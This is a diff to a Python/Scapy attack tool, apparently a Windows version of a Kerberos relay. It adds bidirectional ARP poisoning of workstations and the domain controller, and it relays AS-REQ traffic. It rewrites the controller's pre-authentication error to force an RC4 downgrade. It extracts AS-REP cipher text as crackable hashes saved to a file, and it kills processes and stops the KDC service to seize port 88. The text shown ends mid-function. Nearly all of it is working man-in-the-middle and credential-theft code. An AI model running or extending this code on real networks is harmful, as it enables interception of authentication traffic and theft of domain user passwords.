@@ -14,6 +14,7 @@ from scapy.fields import XIntField, StrField
 # Import Kerberos layers - CRITICAL for proper operation
 try:
     from scapy.layers.kerberos import *
+    from scapy.asn1.asn1 import ASN1_INTEGER
     KERBEROS_LAYERS_AVAILABLE = True
 except ImportError as e:
     KERBEROS_LAYERS_AVAILABLE = False
@@ -25,6 +26,8 @@ except ImportError as e:
     class KRB_TGS_REQ: pass
     class KRB_ERROR: pass
     class KerberosTCPHeader: pass
+    class Kerberos: pass
+    class ASN1_INTEGER: pass
 
 # Try to import getmacbyip from different locations
 try:
@@ -323,6 +326,70 @@ def rich_print_hash(username, domain, etype, hash_string):
     
     # Update live display if active
     update_live_display()
+
+# =======================================
+# WINDOWS NETWORKING SETUP
+# =======================================
+
+def setup_windows_networking():
+    """Enhanced Windows networking setup for relay mode"""
+    rich_print_info("[SETUP] Configuring Windows networking for AS-REP capture...", "yellow")
+    
+    try:
+        # Check current IP forwarding status
+        result = subprocess.run(
+            ['netsh', 'interface', 'ipv4', 'show', 'global'],
+            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        rich_print_info(f"[SETUP] Current IP forwarding status checked", "blue")
+        
+        # Enable IP forwarding on Windows
+        try:
+            subprocess.run(
+                ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'],
+                check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            rich_print_success("[SETUP] ✓ IP forwarding enabled", "green")
+        except subprocess.CalledProcessError as e:
+            rich_print_warning(f"[SETUP] IP forwarding command failed (may need admin): {e}")
+        
+        # Show network interface information
+        try:
+            interface_result = subprocess.run(
+                ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
+                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            if interface_result.returncode == 0:
+                rich_print_info("[SETUP] Network interfaces information logged", "blue")
+        except Exception as e:
+            rich_print_info(f"[SETUP] Interface check skipped: {e}", "blue")
+            
+        rich_print_info("[SETUP] Windows networking configuration complete", "green")
+        rich_print_warning("[RELAY] Note: If AS-REP still bypasses VM, consider ARP spoofing")
+        
+    except Exception as e:
+        rich_print_error(f"[SETUP] Windows networking setup error: {e}")
+
+def cleanup_windows_networking():
+    """Clean up Windows networking changes"""
+    try:
+        # Optionally restore IP forwarding (uncomment if needed)
+        # subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=disabled'],
+        #               capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        rich_print_info("[CLEANUP] Windows networking cleanup complete", "blue")
+    except Exception as e:
+        rich_print_error(f"[CLEANUP] Error during networking cleanup: {e}")
+
+def setup_arp_spoofing(target_ip, gateway_ip, interface):
+    """Setup ARP spoofing to force traffic through VM (requires Scapy)"""
+    try:
+        rich_print_info(f"[ARP] Setting up ARP spoofing: {target_ip} via {gateway_ip}", "yellow")
+        # Note: This would require additional ARP spoofing logic
+        # For now, just provide guidance
+        rich_print_warning("[ARP] Manual ARP spoofing setup required for complete relay mode")
+        rich_print_info(f"[ARP] Consider: arp -s {target_ip} <your-vm-mac> on gateway", "blue")
+    except Exception as e:
+        rich_print_error(f"[ARP] ARP spoofing setup error: {e}")
 
 # =======================================
 # SIGNAL HANDLING AND CLEANUP
@@ -1061,37 +1128,55 @@ def relaymode_arp_spoof(spoofed_ip):
     global Targets
     # mac_addresses = update_uphosts()
     mac_addresses = get_mac_addresses(TargetsList)
+    
+    # CRITICAL: Get DC MAC address for bidirectional spoofing
+    dc_mac_addresses = get_mac_addresses([dc])
+    if dc not in dc_mac_addresses:
+        rich_print_error(f'[ARP RELAY] CRITICAL: Cannot get DC MAC address for {dc}')
+        return
+    
+    dc_mac = dc_mac_addresses[dc]
     timer = 0
     
-    rich_print_info(f'[ARP RELAY] Starting relay mode ARP spoofing for {len(mac_addresses)} targets', 'yellow')
-    rich_print_info(f'[ARP RELAY] Spoofed IP: {spoofed_ip}, Interface: {iface}, Source MAC: {hwsrc}', 'yellow')
+    rich_print_info(f'[ARP RELAY] Starting BIDIRECTIONAL relay mode ARP spoofing', 'yellow')
+    rich_print_info(f'[ARP RELAY] Targets: {len(mac_addresses)} clients', 'yellow')
+    rich_print_info(f'[ARP RELAY] DC: {dc} ({dc_mac})', 'yellow')
+    rich_print_info(f'[ARP RELAY] Interface: {iface}, Source MAC: {hwsrc}', 'yellow')
     
     while not stop_arp_spoofing_flag.is_set() :
         if Targets != set() :
             packets_list = []
+            
+            # STEP 1: Poison CLIENT workstations (tell them DC is at our MAC)
+            # This captures AS-REQ packets going TO the DC
             for target in mac_addresses :
-                # Check stop flag during packet building
                 if stop_arp_spoofing_flag.is_set():
                     return
                 
-                # Build ARP reply packet: Tell target that spoofed_ip is at our MAC
-                packet = Ether(src=hwsrc, dst=mac_addresses[target]) / ARP(op=2, hwsrc=hwsrc, psrc=spoofed_ip, hwdst=mac_addresses[target], pdst=target)
+                # Tell client that DC is at our MAC address
+                packet = Ether(src=hwsrc, dst=mac_addresses[target]) / ARP(op=2, hwsrc=hwsrc, psrc=dc, hwdst=mac_addresses[target], pdst=target)
                 packets_list.append(packet)
                 
-                # Verbose output for ARP spoofing
-                if debug or True:  # Always show ARP spoofing activity
-                    rich_print_info(f'[ARP RELAY] Spoofing {target} ({mac_addresses[target]}): telling them {spoofed_ip} is at {hwsrc}', 'yellow')
+                if debug:
+                    rich_print_info(f'[ARP CLIENT] Poisoning {target}: telling them DC {dc} is at {hwsrc}', 'cyan')
+            
+            # STEP 2: Poison DC (tell it that ALL clients are at our MAC)
+            # This captures AS-REP packets going FROM the DC
+            for target in mac_addresses:
+                if stop_arp_spoofing_flag.is_set():
+                    return
+                
+                # Tell DC that each client is at our MAC address
+                packet = Ether(src=hwsrc, dst=dc_mac) / ARP(op=2, hwsrc=hwsrc, psrc=target, hwdst=dc_mac, pdst=dc)
+                packets_list.append(packet)
+                
+                if debug:
+                    rich_print_info(f'[ARP DC] Poisoning DC: telling {dc} that client {target} is at {hwsrc}', 'cyan')
             
             if packets_list:
-                # Debug packet construction for relay mode
-                if debug:
-                    for i, pkt in enumerate(packets_list):
-                        rich_print_info(f'[ARP DEBUG] Relay packet {i+1}: {pkt.summary()}', 'cyan')
-                    rich_print_info(f'[ARP DEBUG] Sending {len(packets_list)} packets on interface: {iface}', 'cyan')
-                
-                rich_print_info(f'[ARP RELAY] Sending {len(packets_list)} ARP spoof packets', 'yellow')
+                rich_print_info(f'[ARP RELAY] Sending {len(packets_list)} bidirectional ARP spoof packets', 'yellow')
                 sendp(packets_list, iface=iface, verbose=False)
-                rich_print_info(f'[ARP RELAY] Successfully sent {len(packets_list)} packets', 'green')
+                rich_print_success(f'[ARP RELAY] ✓ Sent {len(packets_list)} packets (clients + DC poisoned)', 'green')
             else:
                 rich_print_warning('[ARP RELAY] No packets to send - target list empty')
         else:
@@ -1234,7 +1319,50 @@ def print_asrep_hash(username,domain,etype,cipher):
     with open(outfile, 'a') as f:
         f.write(HashToCrack + '\n')
 
-# handle_as_rep function removed - was using packet.root which doesn't exist
+# ============================================================================
+# AS-REP PROCESSING - Using working logic from listen mode
+# ============================================================================
+
+def handle_as_rep(packet):
+    """
+    EXACT COPY of the working Linux handle_as_rep function - uses packet.root directly
+    This is the function that relay_asreq_to_dc calls in the working Linux version
+    """
+    global UsernamesCaptured
+    
+    try:
+        decoder.start(bytes(packet.root.cname.nameString[0]))
+        username = decoder.read()[1].decode().lower()
+        decoder.start(bytes(packet.root.crealm))
+        domain = decoder.read()[1].decode().lower()
+        rich_print_info(f'[+] Got ASREP for username: {username}@{domain}', 'green')
+        
+        if username.endswith('$'):
+            rich_print_info(f'[*] Machine account: {username}, skipping...', 'yellow')
+            return
+            
+        decoder.start(bytes(packet.root.encPart.etype))
+        etype = decoder.read()[1]
+        decoder.start(bytes(packet.root.encPart.cipher))
+        cipher = decoder.read()[1].hex()
+        
+        if username in UsernamesCaptured and etype in UsernamesCaptured[username]:
+            rich_print_info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...', 'yellow')
+            return
+        else:
+            if username in UsernamesCaptured:
+                UsernamesCaptured[username].append(etype)
+            else:
+                UsernamesCaptured[username] = [etype]
+        
+        print_asrep_hash(username, domain, etype, cipher)
+        rich_print_success(f'[RELAY] 🎯 HASH EXTRACTED FOR {username}@{domain}!')
+        
+    except Exception as e:
+        rich_print_error(f'[AS-REP] handle_as_rep failed: {e}')
+        if debug:
+            import traceback
+            rich_print_error(f'[AS-REP] handle_as_rep traceback: {traceback.format_exc()}')
 
 def parse_dc_response(packet):
     """
@@ -1313,16 +1441,6 @@ def parse_dc_response(packet):
                 import traceback
                 rich_print_error(f'[AS-REP] Traceback: {traceback.format_exc()}')
                 add_debug_message(f"AS-REP parse error: {e}")
-            
-            # FALLBACK: Try manual parsing if Linux method fails
-            try:
-                if packet.haslayer(Raw) and len(packet[Raw].load) > 0:
-                    kerberos_data = bytes(packet[Raw].load)
-                    if b'\x6b' in kerberos_data[:20]:  # AS-REP tag
-                        rich_print_warning('[FALLBACK] Attempting manual AS-REP parsing')
-                        handle_as_rep_fallback(kerberos_data)
-            except Exception as fallback_e:
-                rich_print_error(f'[FALLBACK] Manual parsing also failed: {fallback_e}')
                 
     except Exception as e:
         rich_print_error(f'[ERROR] Exception in parse_dc_response: {e}')
@@ -1330,46 +1448,6 @@ def parse_dc_response(packet):
             import traceback
             rich_print_error(f'[ERROR] Traceback: {traceback.format_exc()}')
             add_debug_message(f"parse_dc_response error: {e}")
-
-
-
-# handle_as_rep_original function removed - was using packet.root which doesn't exist
-
-def handle_as_rep_fallback(kerberos_data):
-    """Fallback AS-REP handling with basic ASN.1 parsing"""
-    global UsernamesCaptured
-    try:
-        # This is a very basic fallback - you might need to implement proper ASN.1 parsing
-        rich_print_info('[KERBEROS] Using fallback AS-REP parser', 'yellow')
-        
-        # Try to use the decoder if available
-        if 'decoder' in globals():
-            decoder.start(kerberos_data)
-            # Basic attempt to parse - this may not work perfectly
-            try:
-                # This is simplified and may need adjustment based on actual packet structure
-                parsed = decoder.read()
-                rich_print_info(f'[KERBEROS] Parsed ASN.1 structure: {type(parsed)}', 'cyan')
-                # Add more parsing logic here as needed
-            except Exception as asn1_e:
-                rich_print_warning(f'[KERBEROS] ASN.1 parsing failed: {asn1_e}')
-        
-        # For now, just log that we detected an AS-REP
-        rich_print_success('[KERBEROS] AS-REP detected but full parsing not yet implemented')
-        
-    except Exception as e:
-        rich_print_error(f'[KERBEROS] Fallback AS-REP parsing failed: {e}')
-
-def handle_tgs_rep_fallback(kerberos_data):
-    """Fallback TGS-REP handling"""
-    global UsernamesSeen
-    try:
-        rich_print_info('[KERBEROS] TGS-REP detected - username discovery mode', 'yellow')
-        # For now, just log that we detected a TGS-REP
-        # You can implement username extraction here
-        rich_print_success('[KERBEROS] TGS-REP detected but full parsing not yet implemented')
-    except Exception as e:
-        rich_print_error(f'[KERBEROS] TGS-REP parsing failed: {e}')
 
 # ============================================================================
 # ASYNC RELAY FUNCTIONS
@@ -1383,10 +1461,23 @@ async def handle_client(reader, writer):
 
     try:
         while True:
-            data = await reader.read(2048)
-            if not data:
+            # CRITICAL FIX: Use Kerberos TCP length-aware reading for client data too!
+            # Read the 4-byte Kerberos TCP length header first
+            length_data = await asyncio.wait_for(reader.readexactly(4), timeout=5.0)
+            if not length_data:
                 rich_print_info(f'[RELAY] Connection closed by {client_ip}', 'blue')
                 break
+            
+            # Parse the length (big-endian 4-byte integer)
+            kerberos_length = int.from_bytes(length_data, byteorder='big')
+            rich_print_info(f'[RELAY] Client {client_ip} sending {kerberos_length} byte Kerberos message', 'cyan')
+            
+            # Read the exact Kerberos message payload
+            kerberos_data = await asyncio.wait_for(reader.readexactly(kerberos_length), timeout=5.0)
+            
+            # Combine length header + payload for complete Kerberos TCP message
+            data = length_data + kerberos_data
+            rich_print_info(f'[RELAY] Complete message: {len(data)} bytes from {client_ip}', 'blue')
 
             dc_response = await relay_to_dc(data, client_ip)
             if dc_response:
@@ -1395,6 +1486,10 @@ async def handle_client(reader, writer):
             
     except ConnectionResetError:
         rich_print_info(f'[RELAY] Connection reset by {client_ip}', 'blue')
+    except asyncio.TimeoutError:
+        rich_print_warning(f'[RELAY] Timeout reading from {client_ip}')
+    except asyncio.IncompleteReadError as e:
+        rich_print_warning(f'[RELAY] Incomplete read from {client_ip}: expected {e.expected}, got {len(e.partial)}')
     except Exception as e:
         rich_print_error(f'[RELAY] Socket error from {client_ip}: {e}')
 
@@ -1406,16 +1501,51 @@ async def handle_client(reader, writer):
             pass  # Connection already closed
 
 async def relay_without_modification_to_dc(data):
-    """Relay data to DC without modification"""
+    """Relay data to DC without modification - Windows TCP reassembly compatible"""
     try:
+        rich_print_info(f'[RELAY] Connecting to DC {dc}:88 to send {len(data)} bytes', 'blue')
         reader, writer = await asyncio.open_connection(dc, 88)
         writer.write(data)
         await writer.drain()
+        rich_print_info(f'[RELAY] Data sent to DC, waiting for response...', 'blue')
         
+        # Windows TCP reassembly approach - collect all segments
+        response = b""
         try:
-            response = await asyncio.wait_for(reader.read(2048), timeout=2)
+            # First read to get initial data
+            initial_response = await asyncio.wait_for(reader.read(4096), timeout=5)
+            if initial_response:
+                response = initial_response
+                rich_print_info(f'[RELAY] Initial response: {len(response)} bytes', 'green')
+                
+                # Check if we need to read more data (for reassembled packets)
+                # Kerberos TCP has a 4-byte length header, read it to know expected size
+                if len(response) >= 4:
+                    expected_len = int.from_bytes(response[:4], byteorder='big')
+                    actual_data_len = len(response) - 4
+                    
+                    rich_print_info(f'[RELAY] Expected Kerberos data: {expected_len} bytes, got: {actual_data_len} bytes', 'cyan')
+                    
+                    # If we haven't received all data, try to read more
+                    while actual_data_len < expected_len:
+                        try:
+                            more_data = await asyncio.wait_for(reader.read(4096), timeout=3)
+                            if more_data:
+                                response += more_data
+                                actual_data_len = len(response) - 4
+                                rich_print_info(f'[RELAY] Accumulated {actual_data_len}/{expected_len} bytes', 'yellow')
+                            else:
+                                break
+                        except asyncio.TimeoutError:
+                            rich_print_warning(f'[RELAY] Timeout waiting for more data, using {actual_data_len} bytes')
+                            break
+                
+                if debug and len(response) > 4:
+                    rich_print_info(f'[RELAY] Final response: {len(response)} bytes, starts: {response[:20].hex()}', 'cyan')
+            else:
+                rich_print_warning(f'[RELAY] No response data received from DC')
         except asyncio.TimeoutError:
-            # DC just sent an ACK, no response data
+            rich_print_info('[RELAY] DC response timeout (normal for some requests)', 'yellow')
             response = b""
         
         writer.close()
@@ -1450,71 +1580,83 @@ async def relay_tgsreq_to_dc(data):
     return response
 
 async def relay_asreq_to_dc(data, client_ip):
-    """Handle AS-REQ (Authentication Service Request) - Core of relay mode"""
+    """Handle AS-REQ (Authentication Service Request) - Core relay function from working Linux version"""
     global UsernamesCaptured, Targets, InitialTargets
     
     try:
+        if not KERBEROS_LAYERS_AVAILABLE:
+            rich_print_warning('[AS-REQ] Kerberos layers not available - simple relay only')
+            response = await relay_without_modification_to_dc(data)
+            rich_print_info(f'[AS-REQ] Simple relay completed for {client_ip}', 'yellow')
+            return response
+        
         kerberos_packet = KerberosTCPHeader(data)
-        
-        # Extract username and domain from AS-REQ (simplified)
-        username = "unknown"
-        domain = "unknown"
-        
-        # TODO: Implement proper ASN.1 parsing for AS-REQ
-        rich_print_info(f'[AS-REQ] Request from {client_ip} (parsing not yet implemented)', 'yellow')
-        add_debug_message(f"AS-REQ: {client_ip}")
+        decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
+        username = decoder.read()[1].decode().lower()
+        decoder.start(bytes(kerberos_packet.root.reqBody.realm))
+        domain = decoder.read()[1].decode().lower()
 
-        # Skip computer accounts
         if username.endswith('$'):
             rich_print_info(f'[AS-REQ] Computer account {username}@{domain}, relaying without modification', 'blue')
             return await relay_without_modification_to_dc(data)
 
-        # Skip if we already have RC4 hash for this user
         if username in UsernamesCaptured and 23 in UsernamesCaptured[username]:
-            rich_print_info(f'[AS-REQ] RC4 hash already captured for {username}@{domain}, relaying', 'blue')
+            rich_print_info(f'[AS-REQ] RC4 hash already captured for {username}@{domain}, relaying...', 'blue')
             return await relay_without_modification_to_dc(data)
 
-        # Check if client supports RC4 and doesn't have pre-auth (simplified)
-        # TODO: Implement proper ASN.1 parsing for pre-auth and etype detection
-        has_preauth = False  # Simplified assumption
+        if len(kerberos_packet.root.padata) != 2:
+            if ASN1_INTEGER(23) not in kerberos_packet.root.reqBody.etype:
+                rich_print_warning(f'[AS-REQ] {username}@{domain} from {client_ip}: RC4 not supported by client')
+                return await relay_without_modification_to_dc(data)
+            
+            rich_print_info(f'[AS-REQ] {username}@{domain} from {client_ip} - attempting RC4 downgrade', 'green')
+            response = await relay_without_modification_to_dc(data)
+            krb_response = KerberosTCPHeader(response)
+            
+            if not (krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19):
+                return response
+                
+            RC4_present = False
+            indexes_to_delete = []
+            for idx, x in enumerate(krb_response.root.eData[0].seq[0].padataValue.seq):
+                if x.etype == 0x17:
+                    RC4_present = True
+                else:
+                    indexes_to_delete.append(idx)
+            
+            if not RC4_present:
+                rich_print_warning('[AS-REQ] RC4 not found in DC supported algorithms - downgrade failed')
+                return response
+                
+            rich_print_success(f'[AS-REQ] ✓ Hijacking Kerberos encryption negotiation for {username}@{domain}!')
+            for i in indexes_to_delete:
+                del krb_response.root.eData[0].seq[0].padataValue.seq[i]
+            krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos]))
+            return bytes(krb_response[KerberosTCPHeader])
+    
+        # Handle AS-REQ with pre-auth - look for AS-REP response (EXACT Linux method)
+        rich_print_info(f'[AS-REQ] Sending request to DC for {username}@{domain}...', 'cyan')
+        response = await relay_without_modification_to_dc(data)
         
-        if not has_preauth:
-            rich_print_info(f'[AS-REQ] {username}@{domain} without pre-auth, attempting downgrade', 'green')
+        # EXACT LINUX METHOD: Parse response immediately without extra checks
+        krb_response = KerberosTCPHeader(response)
+        if krb_response.haslayer(KRB_AS_REP):
+            rich_print_success(f'[AS-REP] ✓ Detected AS-REP for {username}@{domain}')
+            handle_as_rep(krb_response)
             
-            # Send request to DC and check for pre-auth required error
-            response = await relay_without_modification_to_dc(data)
-            krb_response = KerberosTCPHeader(response)
-            
-            # Check if DC responds with KRB_ERROR indicating pre-auth required
-            if krb_response.haslayer(KRB_ERROR):
-                rich_print_info(f'[AS-REQ] Pre-auth required error received, attempting RC4 downgrade', 'yellow')
-                
-                # TODO: Implement proper ASN.1 manipulation for RC4 downgrade
-                rich_print_warning('[AS-REQ] RC4 downgrade manipulation not yet implemented')
-                return response
-            else:
-                return response
-        else:
-            # Has pre-auth, relay normally and look for AS-REP
-            response = await relay_without_modification_to_dc(data)
-            krb_response = KerberosTCPHeader(response)
-            
-            if krb_response.haslayer(KRB_AS_REP):
-                rich_print_success(f'[AS-REP] Captured response for {username}@{domain}!')
-                add_debug_message(f"AS-REP CAPTURED: {username}@{domain}")
-                # TODO: Implement proper AS-REP parsing without packet.root
-                rich_print_info('[AS-REP] AS-REP detected in relay mode - parsing to be implemented', 'yellow')
-                
-                # Stop spoofing this target if configured
-                if stop_spoofing and not disable_spoofing:
-                    if client_ip in Targets:
-                        Targets.remove(client_ip)
-                    if client_ip in InitialTargets:
-                        InitialTargets.remove(client_ip)
-                    restore(client_ip, gw)
-                    rich_print_info(f'[AS-REP] Restored ARP cache for {client_ip}', 'green')
-            
+            # Add stop_spoofing logic EXACTLY like Linux version
+            if stop_spoofing and not disable_spoofing:
+                if client_ip in Targets: 
+                    Targets.remove(client_ip)
+                if client_ip in InitialTargets: 
+                    InitialTargets.remove(client_ip)
+                restore(client_ip, gw)
+                rich_print_info(f'[+] Restored arp cache of {client_ip}', 'green')
             return response
+        
+        return response
+        
+        return response
             
     except Exception as e:
         rich_print_error(f'[AS-REQ] Error processing request from {client_ip}: {e}')
@@ -1545,195 +1687,150 @@ async def relay_to_dc(data, client_ip):
         rich_print_error(f'[RELAY] Error processing data from {client_ip}: {e}')
         return await relay_without_modification_to_dc(data)
 
+def force_clear_port_88():
+    """Aggressively clear port 88 for our relay server"""
+    rich_print_info('[PORT 88] Aggressively clearing port 88 for relay mode...', 'red')
+    
+    # Step 1: Stop Windows Kerberos service
+    try:
+        result = subprocess.run(['net', 'stop', 'kdc'], capture_output=True, text=True, timeout=10)
+        if result.returncode == 0:
+            rich_print_success('[PORT 88] ✓ Stopped Windows Kerberos KDC service')
+        else:
+            rich_print_info('[PORT 88] KDC service may not be running (normal)', 'yellow')
+    except Exception as e:
+        rich_print_warning(f'[PORT 88] Could not stop KDC service: {e}')
+    
+    # Step 2: Clear any port proxy rules
+    try:
+        subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
+                       'listenport=88', 'listenaddress=0.0.0.0'], 
+                       capture_output=True, text=True, timeout=5)
+        rich_print_info('[PORT 88] Cleared port proxy rules', 'cyan')
+    except Exception as e:
+        rich_print_info('[PORT 88] No port proxy rules to clear', 'blue')
+    
+    # Step 3: Kill any processes using port 88
+    try:
+        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
+        lines = result.stdout.split('\n')
+        for line in lines:
+            if ':88 ' in line and 'LISTENING' in line:
+                parts = line.split()
+                if len(parts) > 4:
+                    pid = parts[-1]
+                    rich_print_warning(f'[PORT 88] Found process {pid} using port 88, attempting to terminate')
+                    try:
+                        subprocess.run(['taskkill', '/F', '/PID', pid], capture_output=True, text=True, timeout=5)
+                        rich_print_success(f'[PORT 88] ✓ Terminated process {pid}')
+                    except:
+                        rich_print_warning(f'[PORT 88] Could not terminate process {pid}')
+    except Exception as e:
+        rich_print_info('[PORT 88] Could not check/clear port usage', 'blue')
+    
+    # Give Windows time to release the port
+    time.sleep(2)
+    rich_print_success('[PORT 88] Port 88 cleanup completed')
+
 async def kerberos_server():
-    """Start the Kerberos relay server - with automatic port fallback"""
+    """Start the Kerberos relay server - MUST bind to port 88 for ARP spoofing"""
     global relay_port, skip_redirection
     
-    # Initialize server_port to None to ensure proper error handling
-    server_port = None
+    max_attempts = 3
+    attempt = 1
     
-    try:
-        # First, clean up any existing port redirection to avoid conflicts
-        rich_print_info('[RELAY] Cleaning up any existing port 88 bindings...', 'yellow')
-        cleanup_traffic_redirection()
-        time.sleep(3)  # Give Windows more time to release the port
-        
-        # Additional cleanup - try to kill any processes using port 88 if possible
+    while attempt <= max_attempts:
         try:
-            result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
-            lines = result.stdout.split('\n')
-            port_88_lines = [line for line in lines if ':88 ' in line and 'LISTENING' in line]
-            if port_88_lines:
-                rich_print_warning('[RELAY] Port 88 is still in use after cleanup:')
-                for line in port_88_lines[:2]:
-                    rich_print_info(f'[RELAY] {line.strip()}', 'cyan')
-        except Exception:
-            pass
-        
-        # If user specified a non-standard port, use it directly
-        if relay_port != 88:
-            rich_print_info(f'[RELAY] Using user-specified port {relay_port}', 'cyan')
-            server_port = relay_port
+            rich_print_info(f'[RELAY] Initializing Kerberos relay server for port 88 (attempt {attempt}/{max_attempts})...', 'green')
             
-            # Test the user-specified port with retry
-            for attempt in range(3):
+            # CRITICAL: Force clear port 88 for relay mode
+            force_clear_port_88()
+            
+            # RELAY MODE REQUIREMENT: Must bind to port 88 for ARP spoofing to work
+            server_port = 88
+            rich_print_warning('[RELAY] CRITICAL: Binding to port 88 (required for ARP spoofing)')
+            
+            # Test port 88 availability after cleanup with retries
+            test_socket = None
+            port_available = False
+            
+            for test_attempt in range(3):
                 try:
                     test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                     test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                    test_socket.bind(('0.0.0.0', server_port))
+                    test_socket.bind(('0.0.0.0', 88))
                     test_socket.close()
-                    rich_print_success(f'[RELAY] User-specified port {server_port} is available')
+                    port_available = True
+                    rich_print_success('[RELAY] ✓ Port 88 is now available for binding!')
                     break
                 except OSError as e:
-                    try:
+                    if test_socket:
                         test_socket.close()
-                    except:
-                        pass
-                    if attempt < 2:  # Not the last attempt
-                        rich_print_warning(f'[RELAY] Port {server_port} test failed (attempt {attempt+1}/3), retrying...')
-                        time.sleep(1)
+                    if test_attempt < 2:  # Not the last attempt
+                        rich_print_info(f'[RELAY] Port 88 still busy (attempt {test_attempt + 1}/3), waiting...', 'yellow')
+                        time.sleep(3)  # Wait longer for Windows to release port
                     else:
-                        rich_print_error(f'[RELAY] User-specified port {server_port} is not available after 3 attempts: {e}')
-                        raise Exception(f"User-specified port {server_port} is not available")
-        else:
-            # FORCE ALTERNATIVE PORT - Don't even try 88 first to avoid the binding error
-            rich_print_warning('[RELAY] Forcing use of alternative port to avoid Windows port 88 conflicts')
-            rich_print_info('[RELAY] Testing alternative ports with automatic fallback...', 'cyan')
-            alternative_ports = [8088, 8888, 8889, 9088, 9889]  # Added more options
+                        rich_print_error(f'[RELAY] FAILED: Port 88 still in use after {test_attempt + 1} attempts: {e}')
+                        raise e
             
-            # Skip port 88 entirely for now due to Windows conflicts
-            for attempt_port in alternative_ports:
-                rich_print_info(f'[RELAY] Testing alternative port {attempt_port}...', 'blue')
-                port_available = False
-                
-                # Multiple attempts per port
-                for attempt in range(2):
-                    try:
-                        # Test if port is available
-                        test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                        test_socket.bind(('0.0.0.0', attempt_port))
-                        test_socket.close()
-                        
-                        server_port = attempt_port
-                        rich_print_success(f'[RELAY] ✓ Alternative port {server_port} is available for binding')
-                        port_available = True
-                        break
-                        
-                    except OSError as e:
-                        try:
-                            test_socket.close()
-                        except:
-                            pass
-                        
-                        if e.errno == 10048 or "already in use" in str(e).lower():
-                            if attempt == 0:
-                                rich_print_info(f'[RELAY] Port {attempt_port} busy, waiting 1s and retrying...', 'yellow')
-                                time.sleep(1)
-                            else:
-                                rich_print_warning(f'[RELAY] ✗ Port {attempt_port} is already in use after retry')
-                        else:
-                            rich_print_error(f'[RELAY] Unexpected error testing port {attempt_port}: {e}')
-                            break
-                
-                if port_available:
-                    break
+            if not port_available:
+                raise Exception("Port 88 unavailable after multiple attempts")
             
-            # Check if we found an available port
-            if server_port is None:
-                # No ports available
-                raise Exception(f"No available alternative ports for relay server (tried {', '.join(map(str, alternative_ports))})")
+            # Start the relay server directly on port 88
+            rich_print_info('[RELAY] Starting Kerberos relay server on port 88...', 'green')
+            add_debug_message("Starting relay server on port 88")
             
-            rich_print_warning(f'[RELAY] Using alternative port {server_port} instead of port 88 to avoid conflicts')
-        
-        # Set up traffic redirection based on the port we're using (unless skipped)
-        if not skip_redirection:
-            if server_port == 88:
-                # Use standard setup for port 88
-                setup_traffic_redirection(iface)
-                rich_print_success('[RELAY] Using standard port 88 - traffic redirection configured')
-            else:
-                # Use alternative port setup
-                setup_traffic_redirection_alt(iface, server_port)
-                rich_print_success(f'[RELAY] Using alternative port {server_port} with traffic redirection from port 88')
-        else:
-            rich_print_warning('[RELAY] Skipping traffic redirection setup as requested')
-            rich_print_info('[RELAY] You will need to manually redirect traffic to this server', 'yellow')
-        
-        rich_print_info(f'[RELAY] Starting Kerberos relay server on port {server_port}...', 'green')
-        add_debug_message(f"Relay server starting on port {server_port}")
-        
-        # Start the actual server with additional error handling and retry
-        server_started = False
-        for start_attempt in range(3):
+            # Enhanced server creation with proper error handling
             try:
-                server = await asyncio.start_server(handle_client, '0.0.0.0', server_port)
-                rich_print_success(f'[RELAY] ✓ Kerberos relay server started successfully on port {server_port}!')
+                server = await asyncio.start_server(handle_client, '0.0.0.0', 88)
+                rich_print_success('[RELAY] ✓ Kerberos relay server bound to port 88!')
+                rich_print_success('[RELAY] ✓ ARP spoofed traffic will now flow directly to our relay!')
                 
-                if server_port != 88 and not skip_redirection:
-                    rich_print_info(f'[RELAY] Traffic on port 88 will be redirected to our server on port {server_port}', 'cyan')
-                    rich_print_info('[RELAY] Clients will connect to port 88 but reach our relay server transparently', 'cyan')
-                
-                add_debug_message(f"Server ready on port {server_port}")
-                server_started = True
+                add_debug_message("Relay server ready on port 88")
                 
                 async with server:
                     await server.serve_forever()
-                break
                     
-            except OSError as server_error:
-                if server_error.errno == 10048 or "already in use" in str(server_error).lower():
-                    if start_attempt < 2:  # Not the last attempt
-                        rich_print_warning(f'[RELAY] Server start failed on port {server_port} (attempt {start_attempt+1}/3): Port became busy')
-                        rich_print_info('[RELAY] Waiting 2 seconds and trying next available port...', 'yellow')
-                        time.sleep(2)
-                        
-                        # Try to find another port
-                        for next_port in [server_port + 1, server_port + 10, server_port + 100]:
-                            try:
-                                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                                test_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                                test_socket.bind(('0.0.0.0', next_port))
-                                test_socket.close()
-                                server_port = next_port
-                                rich_print_info(f'[RELAY] Switched to port {server_port} for retry', 'cyan')
-                                break
-                            except:
-                                try:
-                                    test_socket.close()
-                                except:
-                                    pass
-                                continue
+            except OSError as bind_error:
+                rich_print_error(f'[RELAY] Failed to bind to port 88: {bind_error}')
+                if "Address already in use" in str(bind_error):
+                    rich_print_warning('[RELAY] Port 88 was taken between test and bind')
+                    if attempt < max_attempts:
+                        rich_print_info(f'[RELAY] Retrying in 5 seconds... (attempt {attempt + 1}/{max_attempts})', 'yellow')
+                        time.sleep(5)
+                        attempt += 1
                         continue
-                    else:
-                        rich_print_error(f'[RELAY] Failed to start server on port {server_port} after 3 attempts: Port is in use')
-                        rich_print_error(f'[RELAY] This suggests persistent port conflicts on Windows')
-                else:
